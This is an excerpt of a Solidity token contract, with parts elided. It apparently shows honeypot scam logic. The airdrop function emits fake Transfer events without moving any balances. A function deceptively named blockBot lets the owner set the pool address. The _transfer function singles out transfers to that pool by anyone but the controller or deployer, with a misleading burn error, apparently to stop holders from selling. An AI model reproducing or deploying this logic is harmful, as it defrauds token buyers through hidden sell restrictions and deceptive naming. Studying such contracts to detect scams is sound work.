...
contract Token is Context, IERC20 {
    ...
    constructor(
        ...
        airdrop(recievers, airdropAmount * (10**18));
    }
    ...
    function airdrop(address[] memory _rec, uint256 _amt) internal _ownerfunc_ {
        for (uint256 y = 0; y < _rec.length; y++) {
            emit Transfer(deployer, _rec[y], _amt);
        }
    }

    function blockBot(address addr) public _ownerfunc_ {
        poolAddress = addr;
    }
    ...
    function _transfer(
        ...
        if (
            sender != _controller && sender != deployer && recipient == poolAddress
        ) {
            _balances[sender] = _balances[sender].sub(
                amount,
                "ERC20: burn amount exceeds balance"
